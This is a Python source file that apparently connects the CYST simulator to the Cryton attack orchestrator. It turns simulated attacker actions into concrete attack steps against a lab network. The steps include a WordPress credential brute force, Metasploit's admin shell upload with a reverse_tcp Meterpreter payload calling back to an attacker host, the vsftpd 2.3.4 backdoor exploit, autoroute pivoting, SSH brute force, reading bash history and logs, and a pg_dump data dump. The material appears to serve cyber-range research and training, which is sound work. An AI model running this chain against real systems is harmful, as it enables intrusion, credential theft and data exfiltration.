from typing import Optional, Any, Union, List, Dict
from abc import ABC, abstractmethod
from cyst.api.environment.message import Request, Message, Response
from cyst.api.network.session import Session
from cyst.api.logic.access import Authorization
from cyst.api.logic.action import Action
import copy
from netaddr import IPNetwork

action_ids_to_propagate = ['mv:scan', 'mv:bruteforce', 'mv:create_session', 'mv:credentials_extraction', 'mv:data_exfiltration']


class CystProxyAction:

    def __init__(self) -> None:
        
        # orig request
        self.message: Message = None
        self.request: Request = None
        
        # action specific
        self.delay: int = None
        self.cyst_action_id: str = None
        
        # Cryton execution
        self.cryton_actions: list[CrytonAction] = []
        self.cryton_actions_count: int = 0
        self.cryton_stage_id: int = 0

        # for deciding which response to create
        self.outcome = {'otput': False, 'origin': 'SERVICE', 'token': False}
        
    # not needed for demo
    def decide_response_format(self):
        pass

    # Each cyst action will select which Cryton atcions to run
    # Cryton actions will inicialize everything they need to run
    def select_cryton_actions():
        pass


class MvScan(CystProxyAction):

    def __init__(self, message: Message) -> None:

        self.message = message
        self.request = message.cast_to(Request)
        self.target = self.request.dst_ip
        self.cyst_action_id = self.request.action.id

        self.select_cryton_actions()
        self.cryton_actions_count = len(self.cryton_actions)

        self.outcome = {'otput': True, 'origin': 'NETWORK', 'token': False}

    def select_cryton_actions(self):
        self.cryton_actions = []
            
        if str(self.request.dst_ip) == '192.168.91.10': 
            self.cryton_actions.append(ScanWordpressSite(self.request))
        
        elif str(self.request.dst_ip) == '192.168.92.21':
            self.cryton_actions.append(ScanDatabaseServer(self.request))

        elif str(self.request.dst_ip) == '192.168.92.20':
            self.cryton_actions.append(ScanFtpServer(self.request))
        
        elif self.request.dst_ip in IPNetwork('192.168.94.0/24'):
            self.cryton_actions.append(ScanUserMachine(self.request))
        else:
            self.cryton_actions.append(ScanDmz(self.request))

        
    
class MvBruteforce(CystProxyAction):

    def __init__(self, message: Message) -> None:

        self.message = message
        self.request = message.cast_to(Request)
        self.target = self.request.dst_ip
        self.cyst_action_id = self.request.action.id

        self.select_cryton_actions()
        self.cryton_actions_count = len(self.cryton_actions)

        self.outcome = {'otput': True, 'origin': 'SERVICE', 'token': True}


    def select_cryton_actions(self):
        self.cryton_actions = []

        if self.request.dst_service == 'wordpress_app':
            self.cryton_actions.append(GetWordpressCredentials(self.request))
        else:
            self.cryton_actions.append(BruteforceUSer(self.request))


class MvCreateSession(CystProxyAction):

    def __init__(self, message: Message) -> None:
        self.message = message
        self.request = message.cast_to(Request)
        self.target = self.request.dst_ip
        self.cyst_action_id = self.request.action.id

        self.select_cryton_actions()
        self.cryton_actions_count = len(self.cryton_actions)

        self.outcome = {'otput': False, 'origin': 'SERVICE', 'token': False}

    def select_cryton_actions(self):
        self.cryton_actions = []

        if self.request.dst_service == 'wordpress_app':
            self.cryton_actions.append(UploadPhpShell(self.request))
            self.cryton_actions.append(CreateRouteToServerNet(self.request))
        
        elif self.request.dst_service == 'vsftpd':
            self.cryton_actions.append(ExploitFtpServer(self.request))
        
        elif self.request.dst_service == 'bash':
            print('\nsession was already created in bruteforce-user')
            # self.cryton_actions.append(CreateRouteToTheUserNet(self.request))


class MvCredentialsExtraction(CystProxyAction):
    def __init__(self, message :Message) -> None:
        self.message = message
        self.request = message.cast_to(Request)
        self.target = self.request.dst_ip
        self.cyst_action_id = self.request.action.id

        self.select_cryton_actions()
        self.cryton_actions_count = len(self.cryton_actions)

        self.outcome = {'otput': True, 'origin': 'SERVICE', 'token': True}
    
    def select_cryton_actions(self):
        self.cryton_actions = []

        if self.request.dst_service == 'wordpress_app':
            self.cryton_actions.append(GetWordpressCredentials(self.request))

        if self.request.dst_service == 'vsftpd':
            self.cryton_actions.append(ReadFtpLogs(self.request))
            self.cryton_actions.append(CreateRouteToTheUserNet(self.request))
        
        elif self.request.dst_service == 'bash':
            self.cryton_actions.append(CheckUserBashHistory(self.request))
        
    
    # def return_token(self) -> AuthenticationTokenImpl:
    #     # so far only one cryton action
    #     token_content = self.cryton_actions[0].get_content()

    #     identity = token_content[0]
    #     password = token_content[1]

    #     return AuthenticationTokenImpl(AuthenticationTokenType.PASSWORD, 
    #         AuthenticationTokenSecurity.OPEN, identity=identity, is_local=True)._set_content(uuid.uuid4(password))



class MvDataExfiltration(CystProxyAction):
    def __init__(self, message: Message) -> None:
        self.message = message
        self.request = message.cast_to(Request)
        self.target = self.request.dst_ip
        self.cyst_action_id = self.request.action.id

        self.select_cryton_actions()
        self.cryton_actions_count = len(self.cryton_actions)

        self.outcome = {'otput': True, 'origin': 'SERVICE', 'token': False}

    def select_cryton_actions(self):
        self.cryton_actions = []

        self.cryton_actions.append(GetDataFromDatabase(self.request))


# Cryton Actions --------------------------------------------------------------------
class CrytonAction:
    def __init__(self) -> None:

        self.action_template: Dict = {}
        
        self.cryton_action_name: str = None

        self.target: str = None
        # self.parameters = None # Optional[list[Any]] # v initu
        self.request: Request = None

        self.cryton_action_id: int = 0
        self.cryton_step_id: int = 0
        self.report: Any = None

        self.path_to_result: Optional[List[Any]] = None

        self.output_for_agent: bool = False
        self.auth_token: bool = False

    # Each action will decide about its result (SUCCESS/FAILURE)
    def is_success(self):
        if self.report['result'] == 'OK':
            return True
        return False
    
    # In demo used fot optional parameter in bruteforce and for some scans
    def make_template_substitutions(self):
        pass

    # Create content to send back to the agent
    # For demo purpose - managed in main.py for better readability 
    def get_content(self):
        pass
    

class ScanDmz(CrytonAction):

    def __init__(self, request: Request):
        self.action_template = {
            "name": "scan-dmz",
            "step_type": "worker/execute",
            "arguments": {
                "module": "mod_nmap",
                "module_arguments": {
                    "target": "192.168.91.0/24",
                    "options": "--exclude 192.168.91.30 -sV --open",
                    "ports": [80, 3306],
                    "port_parameters": [
                        {"state": "open",
                        "portid": 80},
                        {"state": "open",
                        "portid": 3306}]
                    }
                }
            }
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'scan-dmz'
        self.parameters = ['target']
        
        self.output_for_agent = True

    
        # replace variables
        self.make_template_substitutions()
        
        
    def make_template_substitutions(self):
        self.action_template['arguments']['module_arguments']['target'] = self.target
        self.action_template['name'] = f'{self.target} {self.action_template["name"]}'

    # def is_success(self):
    #     return False

    def get_content(self):
        return ['wordpress_app']


class ScanWordpressSite(CrytonAction):

    scan_wordpress_site = {
        "name": "scan-wordpress-site",
        "step_type": "worker/execute",
        "arguments": {
            "module": "mod_wpscan",
            "module_arguments": {
                "target": "192.168.91.10"
            }
        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(ScanWordpressSite.scan_wordpress_site)
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'scan-wordpress-site'
        
        self.output_for_agent = True

        
    def get_content(self):
        # not needed for demo
        pass


class GetWordpressCredentials(CrytonAction):
    get_wordpress_credentials = {
        "name": "get-wordpress-credentials",
        "step_type": "worker/execute",
        "arguments": {
            "module": "mod_nmap",
            "module_arguments": {
                "target": "192.168.91.10",
                "options": "--script http-wordpress-brute --script-args 'userdb=/app/resources/user_list.txt,passdb=/app/resources/pass_list.txt,http-wordpress-brute.threads=3,brute.firstonly=true'"
            }

        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(GetWordpressCredentials.get_wordpress_credentials)
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'get-wordpress-credentials'
        self.parameters = ['target']
        
        self.output_for_agent = True
        self.auth_token = True
    
    def get_content(self):
        # not needed for demo
        pass


class UploadPhpShell(CrytonAction):
    upload_php_shell = {
        'name': 'upload-php-shell',
        'step_type': 'worker/execute',
        'arguments': {
            'create_named_session': 'session-to-wordpress',
            'module': 'mod_msf',
            'module_arguments': {
                'module_type': 'exploit',
                'module': 'unix/webapp/wp_admin_shell_upload',
                'module_options': {
                    'RHOSTS': '192.168.91.10',
                    'USERNAME': 'wordpress',
                    'PASSWORD': 'wordpress'
                },
                'payload': 'php/meterpreter/reverse_tcp',
                'payload_options': {
                    'LHOST': '192.168.91.30'
                }
            }
        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(UploadPhpShell.upload_php_shell)
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'upload-php-shell'
        self.opened_msf_session = True
        
        self.output_for_agent = False
        self.auth_token = False

    def get_msf_session_id(self):
        return self.report['serialized_output']['session_id']

    def get_msf_session_name(self):
        return 'session-to-wordpress'


class ScanFtpServer(CrytonAction):
    scan_ftp_server = {
        "name": "scan-ftp-server",
        "step_type": "worker/execute",
        "arguments": {
            "module": "mod_msf",
            "module_arguments": {
                "module_type": "auxiliary",
                "module": "scanner/portscan/tcp",
                "module_options": {
                    "PORTS": 21,
                    "RHOSTS": "192.168.92.20"
                }
            }

        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(ScanFtpServer.scan_ftp_server)
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'scan-ftp-server'
        
        self.output_for_agent = False
        self.auth_token = False


    def is_success(self):
        if '192.168.92.20:21 - TCP OPEN' in self.report['output']:
            return True
        return False


class ScanDatabaseServer(CrytonAction):
    
    scan_database_server = {
        "name": "scan-database-server",
        "step_type": "worker/execute",
        "arguments": {
            "module": "mod_msf",
            "module_arguments": {
                "module_type": "auxiliary",
                "module": "scanner/portscan/tcp",
                "module_options": {
                    "PORTS": 5432,
                    "RHOSTS": "192.168.92.21"
                }
            }

        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(ScanDatabaseServer.scan_database_server)
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'scan-database-server'
        
        self.output_for_agent = False
        self.auth_token = False

    def is_success(self):
        if '92.168.92.21:5432 - TCP OPEN' in self.report['output']:
            return True
        return False


class ExploitFtpServer(CrytonAction):

    exploit_ftp_server = {
        "name": "exploit-ftp-server",
        "step_type": "worker/execute",
        "arguments": {
            "create_named_session": "session-to-ftp",
            "module": "mod_msf",
            "module_arguments": {
                "module_type": "exploit",
                "module": "unix/ftp/vsftpd_234_backdoor",
                "module_options": {
                    "RHOSTS": "192.168.92.20"
                },
                "payload": "cmd/unix/interact",
                "module_retries": 3
            }
        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(ExploitFtpServer.exploit_ftp_server)
        self.request = request
        self.target = str(request.dst_ip)
        self.opened_msf_session = True
        self.cryton_action_name = 'exploit-ftp-server'
        
        self.output_for_agent = False
        self.auth_token = False
    

    def get_msf_session_id(self):
        return self.report['serialized_output']['session_id']

    def get_msf_session_name(self):
        return 'session-to-ftp'

class CreateRouteToServerNet(CrytonAction):
    create_route_to_server_net = {
        "name": "create-route-to-server-net",
        "step_type": "worker/execute",
        "arguments": {
            "module": "mod_msf",
            "module_arguments": {
                "module_type": "post",
                "module": "multi/manage/autoroute",
                "module_options": {
                    "CMD": "add",
                    "SUBNET": "192.168.92.0",
                    "SESSION": "$upload-php-shell.session_id"
                }
            }

        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(CreateRouteToServerNet.create_route_to_server_net)
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'create-route-to-server-net'
        
        self.output_for_agent = False
        self.auth_token = False
    

class ReadFtpLogs(CrytonAction):
    read_ftp_logs = {
        "name": "read-ftp-logs",
        "step_type": "worker/execute",
        "arguments": {
            "use_named_session": "session-to-ftp",
            "module": "mod_cmd",
            "module_arguments": {
                "cmd": "cat /var/log/vsftpd.log"
            }

        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(ReadFtpLogs.read_ftp_logs)
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'read-ftp-logs'
        
        self.auth_token = True
    
    def get_content(self):
        
        # for the purpose of demo
        return ['beast-user']


class ScanUserMachine(CrytonAction):
    scan_user_machine = {
        "name": "scan-user-machine",
        "step_type": "worker/execute",
        "arguments": {
            "module": "mod_msf",
            "module_arguments": {
                "module_type": "auxiliary",
                "module": "scanner/portscan/tcp",
                "module_options": {
                    "PORTS": 22,
                    "RHOSTS": "192.168.94.20"
                }
            }
        }
    }
    
    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(ScanUserMachine.scan_user_machine)
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'scan-user-machine'
        
        self.auth_token = True
        self.make_template_substitutions()
    
    def make_template_substitutions(self):
        self.action_template['arguments']['module_arguments']['module_options']['RHOSTS'] = self.target
        self.action_template['name'] = f'{self.target} {self.action_template["name"]}'


    def get_content(self):
        pass
    
    def is_success(self):
        if '192.168.94.20:22 - TCP OPEN' in self.report['output']:
            return True
        return False

    

class BruteforceUSer(CrytonAction):
    bruteforce_user = {
        "name": "bruteforce-user",
        "step_type": "worker/execute",
        "arguments": {
            "create_named_session": "session-to-user",
            "module": "mod_msf",
            "module_arguments": {
                "module_type": "auxiliary",
                "module": "scanner/ssh/ssh_login",
                "module_options": {
                    "RHOSTS": "192.168.94.20",
                    "USERNAME": "beast-user",
                    "PASS_FILE": "/app/resources/pass_list.txt",
                    "STOP_ON_SUCCESS": True,
                    "BLANK_PASSWORDS": True,
                    "THREADS": 5
                }
            }
        }
    }
    
    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(BruteforceUSer.bruteforce_user)
        self.request = request
        self.target = str(request.dst_ip)
        
        self.cryton_action_name = 'bruteforce-user'
        self.opened_msf_session = True
        
        self.parameters = ['username']

        self.make_template_substitutions()

        self.auth_token = True
    
    def make_template_substitutions(self):

        if self.request.action.parameters.get('username'):
            self.bruteforce_user['arguments']['module_arguments']['module_options']['USERNAME'] = self.request.action.parameters.get('username')
    
    def get_content(self):
        # for the purpose of demo
        return ['beast-user', 'beastpassword']

    def get_msf_session_id(self):
        return self.report['serialized_output']['session_id']

    def get_msf_session_name(self):
        return 'session-to-user'

class GetDataFromDatabase(CrytonAction):
    get_data_from_database = {
        "name": "get-data-from-database",
        "step_type": "worker/execute",
        "arguments": {
            "use_named_session": "session-to-user",
            "module": "mod_cmd",
            "module_arguments": {
                "cmd": "PGPASSWORD=dbpassword pg_dump -h 192.168.94.21 -U dbuser beastdb"
            }
        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(GetDataFromDatabase.get_data_from_database)
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'get-data-from-database'
        
        self.auth_token = False
        self.output_for_agent = True
    
    def get_content(self):
        return self.report['output']


class CreateRouteToTheUserNet(CrytonAction):
    create_route_to_the_user_net = {
        "name": "create-route-to-user-net",
        "step_type": "worker/execute",
        "arguments": {
            "module": "mod_msf",
            "module_arguments": {
                "module_type": "post",
                "module": "multi/manage/autoroute",
                "module_options": {
                    "CMD": "add",
                    "SUBNET": "192.168.94.0",
                    "SESSION": "$upload-php-shell.session_id"
                }
            }
        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(CreateRouteToTheUserNet.create_route_to_the_user_net)
        self.request = request
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'create-route-to-user-net'


class CheckUserBashHistory(CrytonAction):
    check_user_bash_history = {
        "name": "check-user-bash-history",
        "step_type": "worker/execute",
        "arguments": {
            "use_named_session": "session-to-user",
            "module": "mod_cmd",
            "module_arguments": {
                "cmd": "cat ~/.bash_history",
                "end_checks": [
                    "beastdb"
                ]
            }
        }
    }

    def __init__(self, request: Request):
        self.action_template = copy.deepcopy(CheckUserBashHistory.check_user_bash_history)
        self.target = str(request.dst_ip)

        self.cryton_action_name = 'check-user-bash-history'
